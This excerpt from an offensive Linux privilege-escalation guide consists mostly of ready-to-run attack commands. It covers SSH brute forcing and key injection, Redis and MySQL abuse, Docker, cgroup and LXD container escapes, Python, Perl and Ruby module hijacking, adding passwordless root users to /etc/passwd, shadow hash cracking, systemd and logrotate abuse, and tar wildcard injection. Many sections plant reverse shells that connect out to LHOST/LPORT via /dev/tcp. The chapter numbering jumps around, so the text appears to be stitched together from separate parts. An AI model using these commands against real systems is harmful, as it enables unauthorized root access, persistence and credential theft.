## 21.1 SSH Enumeration

```bash
# Banner grabbing:
nc -vn TARGET_IP 22
# Output: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3

# Verbose SSH connection (enumerate algorithms, keys):
ssh -v TARGET_IP
ssh -vv TARGET_IP       # More verbose
ssh -vvv TARGET_IP      # Maximum debug info

# Get SSH server version:
nmap -sV -p 22 TARGET_IP
nmap -sV --script ssh-hostkey -p 22 TARGET_IP

# Enumerate supported authentication methods:
ssh -v TARGET_IP 2>&1 | grep "Authentications that can continue"

# Check what keys the server accepts:
ssh-audit TARGET_IP     # https://github.com/jtesta/ssh-audit

# Nmap scripts for SSH:
nmap -p 22 --script ssh-auth-methods TARGET_IP
nmap -p 22 --script ssh-brute --script-args userdb=/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt TARGET_IP
nmap -p 22 --script ssh-publickey-acceptance TARGET_IP
```

## 21.2 SSH Brute Force

```bash
# Hydra SSH brute force:
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
hydra -L users.txt -P passwords.txt ssh://TARGET_IP
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://TARGET_IP:22
# -l = single username
# -L = username list
# -P = password list
# -t = threads (keep low for SSH — 4 max recommended)

# Medusa:
medusa -h TARGET_IP -u root -P /usr/share/wordlists/rockyou.txt -M ssh
medusa -h TARGET_IP -U users.txt -P passwords.txt -M ssh -t 3

# Patator:
patator ssh_login host=TARGET_IP user=root password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed'

# Spray specific passwords (avoid lockout):
hydra -L users.txt -p "Summer2023!" ssh://TARGET_IP  # Password spray

# Rate limiting bypass — slow it down:
hydra -l root -P passwords.txt -t 1 -W 5 ssh://TARGET_IP
# -t 1 = one thread, -W 5 = wait 5 seconds between attempts
```

## 21.3 SSH Key Attacks

```bash
# Finding SSH keys on the system:
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "known_hosts" 2>/dev/null
ls -la ~/.ssh/
ls -la /root/.ssh/ 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null

# Checking for reused keys:
cat /home/*/.ssh/authorized_keys
# If the same key appears for multiple users → one key = multiple accounts

# Known hosts pivoting:
cat ~/.ssh/known_hosts
# Shows hosts this user connected to → potential lateral movement targets!

# Check known hosts format:
ssh-keyscan TARGET_IP 2>/dev/null  # Get server host keys

# Cracking encrypted SSH keys:
# Extract hash:
ssh2john id_rsa_encrypted > id_rsa.hash

# Crack with John:
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
john id_rsa.hash --show

# Crack with hashcat:
hashcat -m 22931 id_rsa.hash /usr/share/wordlists/rockyou.txt  # RSA
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt  # DSA
```

## 21.4 SSH Key Generation & Injection

```bash
# Generate SSH key pair:
ssh-keygen -t rsa -b 4096 -f /tmp/mykey -N ""
ssh-keygen -t ed25519 -f /tmp/mykey -N ""          # Modern, smaller
ssh-keygen -t ecdsa -b 521 -f /tmp/mykey -N ""     # ECDSA

# Keys generated:
# /tmp/mykey     ← PRIVATE key (keep this!)
# /tmp/mykey.pub ← PUBLIC key (put on target)

# Inject public key into authorized_keys:
cat /tmp/mykey.pub >> /home/alice/.ssh/authorized_keys
# Or:
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Make sure permissions are correct:
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Connect with private key:
chmod 600 /tmp/mykey      # Must be readable only by owner
ssh -i /tmp/mykey alice@TARGET_IP
ssh -i /tmp/mykey root@TARGET_IP
```

## 21.5 SSH Config File Tricks

```bash
# SSH client config: ~/.ssh/config
# Useful for complex access scenarios:

Host target
    HostName TARGET_IP
    User alice
    IdentityFile /tmp/mykey
    Port 22
    ServerAliveInterval 60

# Then: ssh target (instead of long command)

# Disable host key checking (CTF/lab use only):
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@HOST

# Pass specific cipher (old systems):
ssh -c aes128-cbc user@HOST

# Force password auth (disable key auth):
ssh -o PreferredAuthentications=password user@HOST
```

## 21.6 SSH Port Forwarding & Tunneling

```bash
# Local port forwarding: expose remote service locally
ssh -L LOCAL_PORT:REMOTE_HOST:REMOTE_PORT user@SSH_SERVER
# Example: Access internal web server at 192.168.1.5:80 via SSH jump host
ssh -L 8080:192.168.1.5:80 user@SSH_JUMP_HOST
# Then: curl http://localhost:8080

# Remote port forwarding: expose local service on remote machine
ssh -R REMOTE_PORT:LOCAL_HOST:LOCAL_PORT user@SSH_SERVER
# Example: Expose your local port 4444 on the remote server's port 4444
ssh -R 4444:127.0.0.1:4444 user@SSH_SERVER

# Dynamic port forwarding (SOCKS proxy):
ssh -D 1080 user@SSH_SERVER
# Then use proxychains or browser SOCKS proxy:
proxychains nmap -sT TARGET_INTERNAL_IP
proxychains curl http://INTERNAL_SERVER

# Double SSH tunnel (for hard-to-reach systems):
ssh -L 2222:INTERNAL_HOST:22 user@JUMP_HOST
# Then in another terminal:
ssh -p 2222 user@localhost

# Persistent SSH tunnel (no terminal):
ssh -N -f -L 8080:INTERNAL:80 user@JUMP_HOST
# -N = don't execute remote command
# -f = go to background
```

## 21.7 SSH with Restricted Shell Bypass

```bash
# If you're dropped into rbash (restricted bash):
# Test restrictions:
echo $SHELL   # Shows /bin/rbash
cd /          # "restricted" error
export PATH   # "restricted" error

# Bypass methods:
ssh user@TARGET /bin/bash       # Request bash directly
ssh user@TARGET "bash --noprofile --norc"  # No profile

# If SSH allows commands:
ssh user@TARGET -t bash
ssh user@TARGET -t /bin/bash --noprofile

# Escape via programs:
vi
:set shell=/bin/bash
:shell

# Via python:
python -c 'import pty; pty.spawn("/bin/bash")'

# Via scp (sometimes allowed in restricted shells):
scp user@TARGET:/etc/passwd /tmp/
```

---

# Chapter 22: Cron Job Exploitation (Advanced)

## 22.1 Real-Time Cron Monitoring

```bash
# Method 1: pspy (most reliable)
./pspy64 -i 50    # Check every 50ms
# Watch for UID=0 processes (root) being spawned

# Method 2: inotifywait (monitor filesystem):
inotifywait -m -r /tmp /var/spool/cron /etc/cron* 2>/dev/null

# Method 3: Watching process list repeatedly
while true; do ps aux | grep cron; sleep 0.5; done

# Method 4: tail log files
tail -f /var/log/syslog | grep -i cron
tail -f /var/log/cron.log
grep -a "CRON" /var/log/syslog
```

---

# Chapter 23: Internal Services Exploitation

## 23.1 Finding Hidden Internal Services

```bash
# Services listening on localhost only (NOT exposed externally):
ss -tulpn | grep 127.0.0.1
netstat -tulpn | grep 127.0.0.1

# Common interesting internal services:
# Port 3306 → MySQL
# Port 5432 → PostgreSQL
# Port 27017 → MongoDB
# Port 6379 → Redis
# Port 11211 → Memcached
# Port 8080/8443 → Internal web apps
# Port 9200 → Elasticsearch
# Port 2181 → Zookeeper
```

## 23.2 Redis Exploitation

```bash
# If Redis is running on localhost without auth:
redis-cli -h 127.0.0.1
redis-cli -h 127.0.0.1 ping   # Should return: PONG

# Redis as root? Use it to write files!
redis-cli -h 127.0.0.1

# Method 1: Write SSH key to root's authorized_keys
redis-cli -h 127.0.0.1 config set dir /root/.ssh
redis-cli -h 127.0.0.1 config set dbfilename authorized_keys
redis-cli -h 127.0.0.1 set key "\n\n\nYOUR_PUBLIC_KEY\n\n\n"
redis-cli -h 127.0.0.1 save
ssh -i /tmp/mykey root@TARGET_IP

# Method 2: Write cron job
redis-cli -h 127.0.0.1 config set dir /var/spool/cron/crontabs
redis-cli -h 127.0.0.1 config set dbfilename root
redis-cli -h 127.0.0.1 set key "\n\n*/1 * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1\n\n"
redis-cli -h 127.0.0.1 save
```

## 23.3 MySQL Exploitation

```bash
# Connect to MySQL:
mysql -u root -p            # With password prompt
mysql -u root -pPASSWORD    # With password (no space!)
mysql -u root               # Try without password
mysql -h 127.0.0.1 -u root -ppassword

# Inside MySQL — enumerate:
SHOW DATABASES;
USE mysql;
SELECT user, password, host FROM user;   # Get password hashes
SELECT user, authentication_string FROM user;  # MySQL 5.7+

# Crack MySQL hashes:
# MySQL 4.1+: *HASH format
# Hashcat mode: 300
hashcat -m 300 mysql_hashes.txt rockyou.txt

# MySQL User-Defined Functions (UDF) for command execution:
# If MySQL runs as root and you can write to plugin directory:
# 1. Find plugin directory:
SHOW VARIABLES LIKE 'plugin_dir';

# 2. Write malicious .so file (raptor_udf.c):
# Compile and upload to plugin dir
# 3. Create UDF:
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf.so';
SELECT sys_exec('bash -i >& /dev/tcp/LHOST/LPORT 0>&1');
```

---

# PART VIII — ADVANCED TECHNIQUES

---

# Chapter 25: Docker Container Escapes

## 25.1 Detecting if You're in a Container

```bash
# Check for container indicators:
cat /proc/1/cgroup        # Shows docker/kubernetes if in container
ls /.dockerenv            # This file exists in Docker containers
cat /etc/hostname         # Often a random hash in containers

# More thorough checks:
grep -i docker /proc/1/cgroup 2>/dev/null
grep -i kubepods /proc/1/cgroup 2>/dev/null
cat /run/.containerenv 2>/dev/null    # Podman containers
systemd-detect-virt --container 2>/dev/null

# Check if running with --privileged:
cat /proc/self/status | grep CapEff   # Effective capabilities
# If CapEff: 0000003fffffffff → ALL capabilities = privileged!

# Decode capabilities:
capsh --decode=0000003fffffffff
```

## 25.2 Privileged Container Escape

If you're in a privileged Docker container (has all capabilities, can mount host):

```bash
# Verify privileged:
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff → privileged!

# Method 1: Mount host filesystem
# Find host disk:
fdisk -l    # or: lsblk, ls /dev/sd*

# Mount host root:
mkdir /tmp/host
mount /dev/sda1 /tmp/host      # Mount host's root partition
ls /tmp/host/root/             # Access host's root directory!
cat /tmp/host/etc/shadow       # Read host shadow!

# Write authorized_keys to host:
echo "YOUR_SSH_PUB_KEY" >> /tmp/host/root/.ssh/authorized_keys
# SSH to host as root!

# Method 2: Escape via cgroups (release_agent)
# Creates a reverse shell by abusing cgroup's release_agent
mkdir /tmp/cgroup
mount -t cgroup -o rdma cgroup /tmp/cgroup
mkdir /tmp/cgroup/x

# Set up notification when cgroup is empty:
echo 1 > /tmp/cgroup/x/notify_on_release
# Get path of release_agent:
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Create shell script:
cat > /cmd << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
EOF
chmod +x /cmd
echo "$host_path/cmd" > /tmp/cgroup/release_agent

# Trigger: run process in cgroup then kill it
sh -c "echo \$\$ > /tmp/cgroup/x/cgroup.procs"
# Process dies → cgroup empty → release_agent runs → reverse shell!
```

## 25.3 Docker Socket Escape

If the Docker socket is mounted inside the container:

```bash
# Check for mounted socket:
ls -la /var/run/docker.sock
find / -name "docker.sock" 2>/dev/null

# If accessible, use docker CLI inside container:
docker ps              # Lists containers
docker images          # Lists images

# Mount host into new container:
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# → Shell on host as root!

# Or:
docker run -it --privileged ubuntu bash
# → Privileged container on host
```

## 25.4 LXC/LXD Container Escape

If current user is in the lxd/lxc group:

```bash
# Check group membership:
id | grep lxd

# If in lxd group — can create privileged containers!
# Method: Create Alpine container with host mounted
lxc image list   # What images are available?

# If no images — import one:
# Attacker: Download Alpine LXD image
# https://github.com/saghul/lxd-alpine-builder
./build-alpine
# → alpine-v3.xx-x86_64-XXXXXXXX_XXXX.tar.gz

# Transfer to victim and import:
lxc image import ./alpine-v3.xx.tar.gz --alias myimage

# Create privileged container:
lxc init myimage ignite -c security.privileged=true

# Mount host filesystem:
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Start and exec into it:
lxc start ignite
lxc exec ignite /bin/sh
# Now inside container as root with host mounted at /mnt/root!

ls /mnt/root/root/        # Host's root directory!
cat /mnt/root/etc/shadow  # Host's shadow file!

# Make bash SUID on host:
chmod +s /mnt/root/bin/bash
# Exit container, run on host:
bash -p   # ROOT!
```

---

# Chapter 27: Python, Perl, Ruby Script Exploitation

## 27.1 Exploiting Python Scripts Run as Root

Python is a scripting language used heavily for automation. When Python scripts run as root (via cron, sudo, or SUID), they present multiple attack surfaces.

### 27.1.1 Writable Python Script

```bash
# Scenario: /opt/monitor.py runs as root via cron
cat /opt/monitor.py    # Read its contents
ls -la /opt/monitor.py  # Check permissions

# If writable:
echo "import os; os.system('bash -c \"bash -i >& /dev/tcp/LHOST/LPORT 0>&1\"')" >> /opt/monitor.py
# Append reverse shell — runs as root on next cron execution!
```

### 27.1.2 Python Module Hijacking via PYTHONPATH

```bash
# Scenario: root cron runs: python3 /opt/cleanup.py
# cleanup.py contains: import os, import subprocess, import requests, etc.

# If PYTHONPATH is set to a user-writable directory:
echo $PYTHONPATH          # Check current value
cat /etc/environment      # System-wide env vars
cat /etc/profile          # Profile scripts

# Or if the script's directory is writable and Python searches it first:
# Python module search order:
# 1. Script's own directory (current directory or script's location)
# 2. PYTHONPATH directories
# 3. Installation-dependent default

# If the script imports "os" and you can write to its directory:
cat > /opt/os.py << 'EOF'
import pty
import socket

# This module will be loaded INSTEAD of the real os module!
# But it needs to still work so the script doesn't crash immediately:
import subprocess
subprocess.Popen(['bash', '-c', 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'])

# Import real os to avoid breaking the script:
import importlib.util, sys
spec = importlib.util.spec_from_file_location("os", "/usr/lib/python3.8/os.py")
real_os = importlib.util.module_from_spec(spec)
spec.loader.exec_module(real_os)
sys.modules['os'] = real_os
EOF

# Wait for cron — root runs /opt/cleanup.py → imports /opt/os.py first → reverse shell!
```

### 27.1.3 Python Library Injection via .pth Files

```bash
# .pth files in Python's site-packages add directories to sys.path
# If site-packages is writable:

python3 -c "import site; print(site.getsitepackages())"
# ['/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3.8']

ls -la /usr/local/lib/python3.8/dist-packages/
# If writable:

# Create .pth file pointing to our directory:
echo "/tmp" > /usr/local/lib/python3.8/dist-packages/evil.pth
# Now any Python3 script has /tmp in its import path!

# Create evil module:
cat > /tmp/requests.py << 'EOF'
import os
os.system('bash -i >& /dev/tcp/LHOST/LPORT 0>&1')
# Then import real requests (optional, to avoid crash):
EOF
# Any Python3 script doing "import requests" now runs our code!
```

### 27.1.4 sudo Python with Controlled Script

```bash
# Scenario: sudo -l shows:
# (root) NOPASSWD: /usr/bin/python3 /opt/scripts/*.py
# The wildcard means we can specify which .py file!

# Check if we can write to /opt/scripts/:
ls -la /opt/scripts/

# If writable — create evil script:
cat > /opt/scripts/evil.py << 'EOF'
import os
os.setuid(0)
os.setgid(0)
os.system("/bin/bash")
EOF

sudo /usr/bin/python3 /opt/scripts/evil.py    # Run as root!

# If wildcard is in different position, also try:
sudo /usr/bin/python3 /opt/scripts/../../tmp/evil.py
```

### 27.1.5 PYTHONSTARTUP Exploitation

```bash
# PYTHONSTARTUP: Python executes this file when starting interactively

export PYTHONSTARTUP=/tmp/evil.py
cat > /tmp/evil.py << 'EOF'
import os
os.system('bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"')
EOF

# If a root process starts Python interactively (very rare but happens in some automation)
# → Our file executes first!

# Check if env_keep includes PYTHONSTARTUP:
sudo -l | grep PYTHONSTARTUP
```

---

## 27.2 Perl Script Exploitation

### 27.2.1 PERL5LIB Module Hijacking

```bash
# Perl searches for modules in PERL5LIB directories:
echo $PERL5LIB
echo $PERLLIB

# If a root-run Perl script does: use Socket; use POSIX; etc.
# And PERL5LIB is user-writable:
export PERL5LIB=/tmp

# Create malicious module:
cat > /tmp/Socket.pm << 'EOF'
package Socket;
use strict;
system('bash -i >& /dev/tcp/LHOST/LPORT 0>&1');
# Re-export symbols the real Socket would export:
1;  # Return true
EOF

# When root Perl script runs "use Socket" → loads /tmp/Socket.pm first!
```

### 27.2.2 Writable Perl Script or Library

```bash
# Find Perl scripts run as root:
find / -name "*.pl" -perm -4000 2>/dev/null   # SUID Perl scripts
find / -name "*.pl" -user root -writable 2>/dev/null  # Writable root-owned scripts

# Append reverse shell:
echo 'use Socket; ... exec("/bin/bash");' >> /path/to/root_script.pl
```

---

## 27.3 Ruby Script Exploitation

```bash
# RUBYLIB — library path for Ruby:
export RUBYLIB=/tmp

# GEM_HOME / GEM_PATH — RubyGems locations:
export GEM_HOME=/tmp/gems
export GEM_PATH=/tmp/gems

# If a root Ruby script uses: require 'json' or require 'net/http'
# And RUBYLIB is user-controlled:
cat > /tmp/json.rb << 'EOF'
system('bash -i >& /dev/tcp/LHOST/LPORT 0>&1')
EOF
# Root script "require 'json'" → loads /tmp/json.rb!

# RUBYOPT — default command-line options passed to ruby:
export RUBYOPT='-r/tmp/evil'
cat > /tmp/evil.rb << 'EOF'
system('bash -i >& /dev/tcp/LHOST/LPORT 0>&1')
EOF
# Any Ruby execution now loads /tmp/evil.rb first!
```

---

# Chapter 28: /etc/passwd and /etc/shadow Attacks — Deep Dive

## 28.1 The Passwd File Attack Vector

`/etc/passwd` is world-readable by design (programs need to look up usernames). It should NOT be world-writable, but misconfigurations happen.

### 28.1.1 Checking and Exploiting Writable /etc/passwd

```bash
# Check writable:
ls -la /etc/passwd
stat /etc/passwd

# Also check:
ls -la /etc    # Is the directory writable? Can we replace the file?

# =====================================================
# METHOD 1: Append a root user (simplest)
# =====================================================

# Understanding passwd entry format:
# username:password:UID:GID:GECOS:home_dir:shell
# The 'x' in password field means "check /etc/shadow"
# If you put a HASH here directly, shadow is bypassed!
# If you put NOTHING here (empty), no password is required!

# Append user with UID 0 and NO password:
echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd
su hacker    # Just press Enter when prompted for password!
id           # → uid=0(root) gid=0(root) FULL ROOT!

# Append user with UID 0 and KNOWN password:
# First generate the hash:
openssl passwd -1 "mypassword"        # MD5 hash (older systems)
# Output: $1$abc12345$hashvalue...
openssl passwd -6 "mypassword"        # SHA-512 (modern)
# Output: $6$salt$longhashvalue...

# Or use Python:
python3 -c "import crypt; print(crypt.crypt('mypassword', crypt.mksalt(crypt.METHOD_SHA512)))"

# Append with password hash:
echo 'hacker:$1$abc$HASHVALUE:0:0:hacker:/root:/bin/bash' >> /etc/passwd
su hacker    # Password: mypassword → ROOT!

# =====================================================
# METHOD 2: Replace root's 'x' to bypass shadow
# =====================================================

# Generate hash:
HASH=$(openssl passwd -1 "pwned")
# Backup:
cp /etc/passwd /tmp/passwd.bak
# Replace 'x' in root's entry with hash (sed):
sed -i "s/^root:x/root:$HASH/" /etc/passwd
# Now su root with password "pwned":
su root      # Password: pwned → ROOT!

# =====================================================
# METHOD 3: If only DIRECTORY is writable (replace file)
# =====================================================

ls -la / | grep "etc"
# drwxrwxr-x ... etc  ← Others can write to /etc!

# Copy passwd, modify, replace:
cp /etc/passwd /tmp/my_passwd
echo 'hacker::0:0:hacker:/root:/bin/bash' >> /tmp/my_passwd
# Replace the real file:
cp /tmp/my_passwd /etc/passwd

# =====================================================
# METHOD 4: Using Python or Perl to write if shell restricted
# =====================================================
python3 -c "
f = open('/etc/passwd', 'a')
f.write('hacker::0:0:hacker:/root:/bin/bash\n')
f.close()
print('Done')
"

perl -e "
open(my \$f, '>>', '/etc/passwd') or die \$!;
print \$f 'hacker::0:0:hacker:/root:/bin/bash\n';
close(\$f);
print 'Done\n';
"
```

## 28.2 /etc/shadow Attacks

```bash
# Check readable:
cat /etc/shadow 2>/dev/null
ls -la /etc/shadow

# /etc/shadow format:
# username:hash:lastchange:min:max:warn:inactive:expire:reserved

# Example line:
# root:$6$salt$longhashhere:18000:0:99999:7:::
#      ^   ^   ^
#      |   |   └── Days since Jan 1, 1970 of last password change
#      |   └────── Salt used in hashing
#      └────────── Hash algorithm: $6$ = SHA-512

# =====================================================
# HASH EXTRACTION
# =====================================================

# Extract only lines with actual hashes (not ! or *):
cat /etc/shadow | grep -v '!' | grep -v '*' | grep -v '^$'

# Extract just username:hash pairs:
cat /etc/shadow | awk -F: '$2 != "" && $2 != "!" && $2 != "*" {print $1":"$2}'

# =====================================================
# OFFLINE CRACKING WITH HASHCAT
# =====================================================

# Identify hash type from prefix:
# $1$  = MD5crypt      → hashcat mode 500
# $2a$ = bcrypt        → hashcat mode 3200
# $2b$ = bcrypt        → hashcat mode 3200
# $5$  = SHA-256crypt  → hashcat mode 7400
# $6$  = SHA-512crypt  → hashcat mode 1800 (most common!)
# $y$  = yescrypt      → hashcat mode 15900

# Hashcat on shadow hashes:
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt
# Options:
# -m 1800   → sha512crypt
# -r rules/best64.rule  → apply mutation rules
# --show    → show cracked passwords
# --outfile cracked.txt → save results
# -a 0      → dictionary attack (default)
# -a 3      → brute force mask attack

# Brute force short passwords:
hashcat -m 1800 shadow.txt -a 3 ?a?a?a?a?a?a    # 6-char brute force
# Masks:
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = symbol, ?a = all

# Rule-based attack:
hashcat -m 1800 shadow.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1800 shadow.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# =====================================================
# OFFLINE CRACKING WITH JOHN
# =====================================================

# Unshadow first (combine passwd + shadow):
unshadow /etc/passwd /etc/shadow > combined.txt

# Crack:
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
john combined.txt --wordlist=rockyou.txt --rules   # With mutation rules

# Show cracked:
john combined.txt --show

# Single crack mode (uses username as base):
john combined.txt --single

# Brute force:
john combined.txt --incremental

# =====================================================
# SHADOW FILE WRITABLE — ADD KNOWN HASH
# =====================================================

# If /etc/shadow is writable:
# Generate hash for password "hacked123":
python3 -c "import crypt; print(crypt.crypt('hacked123', crypt.mksalt(crypt.METHOD_SHA512)))"
# Output: $6$randomsalt$longhashhereabcdef...

# Replace root's hash in shadow:
sed -i 's|^root:[^:]*:|root:$6$salt$yourhashhere:|' /etc/shadow
su root    # Password: hacked123 → ROOT!
```

## 28.3 /etc/group Exploitation

```bash
# If /etc/group is writable — add yourself to privileged groups!
ls -la /etc/group

# Add yourself to sudo group:
sed -i 's/^sudo:x:[0-9]*:/&alice,/' /etc/group
# Relogin or use newgrp:
su - alice    # Or newgrp sudo, or logout and login

# Add yourself to docker group:
sed -i 's/^docker:x:[0-9]*:/&alice,/' /etc/group
# Then: docker run --rm -it -v /:/mnt ubuntu chroot /mnt bash

# Add yourself to disk group:
# Disk group = direct read access to block devices = read entire filesystem!
sed -i 's/^disk:x:[0-9]*:/&alice,/' /etc/group
# Then: dd if=/dev/sda | strings | grep -i password

# Add yourself to lxd group:
sed -i 's/^lxd:x:[0-9]*:/&alice,/' /etc/group
# Then use LXD container escape (Chapter 25)

# Verify new group membership:
id    # May not show until you su or newgrp
newgrp sudo   # Switch to sudo group in current shell
groups        # Show current groups
```

---

# Chapter 29: Shared Object Hijacking & RPATH

(See Chapter 20 for the full treatment. This chapter covers additional scenarios.)

## 29.1 Searching for Hijackable .so Files in Non-Standard Locations

```bash
# Enumerate SUID binary library dependencies more thoroughly:
for bin in $(find / -perm -4000 -type f 2>/dev/null); do
    echo "--- $bin ---"
    ldd "$bin" 2>/dev/null | grep -E "not found|=> /"
    readelf -d "$bin" 2>/dev/null | grep -E "RPATH|NEEDED"
    echo
done

# Find world-writable directories in library paths:
cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2>/dev/null | while read path; do
    [ -d "$path" ] && ls -lad "$path"
done | grep -E "^d.{6}w|^d.{3}w"   # Group or world writable!
```

## 29.2 Using objdump and readelf

```bash
# objdump — binary analysis:
objdump -p /usr/local/bin/target | grep -E "NEEDED|RPATH|RUNPATH"
# NEEDED: libcustom.so.1    ← requires this library
# RPATH: /opt/lib           ← searches here first

# readelf — ELF format inspector:
readelf -d /usr/local/bin/target | grep -E "NEEDED|RPATH|RUNPATH"
readelf -s /usr/local/bin/target | grep "FUNC"   # List imported/exported functions
readelf -l /usr/local/bin/target                 # Program headers (segments)
readelf -S /usr/local/bin/target                 # Section headers

# Check binary protections:
checksec --file=/usr/local/bin/target
# Shows: RELRO, Stack Canary, NX, PIE, RPATH, Symbols status
# RELRO Full = GOT is read-only after loading (harder to exploit)
# PIE enabled = Position Independent Executable (ASLR works)
```

---

# Chapter 30: Logrotate, Systemd Timer & Service Exploitation

## 30.1 Logrotate Exploitation (CVE-2016-6663 Style)

Logrotate is a system utility that rotates, compresses, and manages log files. It typically runs as root. If you can control what files logrotate processes, you can exploit it.

```bash
# Find logrotate configuration:
cat /etc/logrotate.conf
ls /etc/logrotate.d/
cat /etc/logrotate.d/nginx
cat /etc/logrotate.d/apache2

# logrotate config syntax:
# /var/log/nginx/*.log {      ← path to log files
#     daily                   ← rotate daily
#     rotate 14               ← keep 14 old copies
#     compress                ← compress old logs
#     create 640 root adm    ← create new log with these perms
#     postrotate              ← script to run after rotation
#         service nginx reload ← run this command
#     endscript
# }

# ATTACK: If postrotate script or prerotate script points to something we control:
# OR: if a log file path includes a directory we can write to

# Find logrotate configs that run custom scripts:
grep -r "postrotate\|prerotate" /etc/logrotate.d/ 2>/dev/null
```

### 30.1.1 Logrotate Race Condition Attack (logrotten)

```bash
# Tool: https://github.com/whotwagner/logrotten
# Exploits race condition when logrotate creates new log files

# Step 1: Identify a logrotate config that creates a writable log
# The log must be in a directory where we have write access
# (e.g., if our user controls a service that writes to /var/log/myapp/)

# Step 2: Compile logrotten:
git clone https://github.com/whotwagner/logrotten
cd logrotten
gcc -o logrotten logrotten.c

# Step 3: Create payload:
cat > /tmp/payload << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
EOF
chmod +x /tmp/payload

# Step 4: Trigger logrotate while running logrotten:
# Terminal 1 - run logrotten:
./logrotten -p /tmp/payload /var/log/myapp/access.log

# Terminal 2 - trigger log rotation:
echo test >> /var/log/myapp/access.log
# OR wait for the scheduled rotation

# logrotten exploits the brief window during file creation to:
# → Write our payload into the newly created log file
# → Which then gets executed with root privileges
```

## 30.2 Systemd Service & Timer Exploitation

Systemd services and timers replace traditional cron jobs on modern Linux systems.

```bash
# List all systemd services:
systemctl list-units --type=service
systemctl list-units --type=service --state=active

# List systemd timers (like cron):
systemctl list-timers
systemctl list-timers --all

# View a timer:
cat /etc/systemd/system/backup.timer
# [Timer]
# OnCalendar=daily       ← runs daily
# Persistent=true        ← catch up missed runs

# View the associated service:
cat /etc/systemd/system/backup.service
# [Service]
# User=root
# ExecStart=/opt/backup.sh    ← script run as root!

# Exploitation vectors:

# 1. Writable service file:
ls -la /etc/systemd/system/vulnerable.service
# If writable:
cat > /etc/systemd/system/vulnerable.service << 'EOF'
[Unit]
Description=Hacked Service

[Service]
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl restart vulnerable.service    # Trigger with sudo or wait for timer

# 2. Writable ExecStart binary:
# If the service runs /opt/backup.sh and it's writable:
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /opt/backup.sh

# 3. Writable timer file:
# If .timer file is writable, change OnCalendar to trigger sooner:
sed -i 's/OnCalendar=.*/OnCalendar=*:*:0\/1/' /etc/systemd/system/backup.timer
# → Now fires every minute!

# 4. Check systemd user services (running as your user but can have exploits):
systemctl --user list-units
ls ~/.config/systemd/user/

# Find writable service files:
find /etc/systemd /lib/systemd /usr/lib/systemd -writable -type f 2>/dev/null
```

## 30.3 D-Bus Service Exploitation

```bash
# D-Bus is an inter-process communication system
# Some D-Bus services run as root and accept messages from users

# List D-Bus services:
busctl list
busctl tree org.freedesktop.systemd1

# Introspect a service:
busctl introspect org.freedesktop.systemd1 /org/freedesktop/systemd1

# If a D-Bus service exposes methods that run commands as root:
dbus-send --system --print-reply \
    --dest=com.example.RootService \
    /com/example/RootService \
    com.example.RootService.RunCommand \
    string:"bash -i >& /dev/tcp/LHOST/LPORT 0>&1"

# Check for exposed D-Bus vulnerabilities:
# CVE-2021-3560 - Polkit D-Bus authentication bypass
# Affects: RHEL 8, Ubuntu 20.04, Fedora 21
```

---

# Chapter 26: Wildcard Injection (Advanced)

## 26.1 Theory

When a command uses a wildcard (*), the shell expands it to all matching filenames. If filenames look like command-line flags, many programs interpret them as flags rather than files.

## 26.2 Complete tar Wildcard Exploitation

```bash
# Vulnerable cron: * * * * * root cd /backup && tar czf backup.tar.gz *

# Setup in /backup directory:
cd /backup

# Create the evil script:
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
EOF
chmod +x shell.sh

# Create files that look like tar flags:
touch -- --checkpoint=1
touch -- '--checkpoint-action=exec=sh shell.sh'
# Note: -- tells touch that filenames start (handle leading -)

# Alternative: using printf
printf '' > '--checkpoint=1'
printf '' > '--checkpoint-action=exec=sh shell.sh'

# ls to verify:
ls -la
# Should show: --checkpoint=1  --checkpoint-action=exec=sh shell.sh  shell.sh

# When tar expands *:
# tar czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh <other files>
# → tar interprets these as flags → executes shell.sh → REVERSE SHELL!
```

## 26.3 chmod Wildcard Exploitation

```bash
# Vulnerable: chmod -R * directory
# Create file named --reference:
touch -- '--reference=reference_file'
# Chmod uses permissions from reference_file for all other files!
```

## 26.4 chown Wildcard Exploitation

```bash
# Similar: touch -- '--reference=reference_file'
# Chown uses owner from reference_file
```

---

# PART IX — NETCAT & PIVOTING

---

# Chapter 29: Netcat — The Complete Guide

## 29.1 What is Netcat?

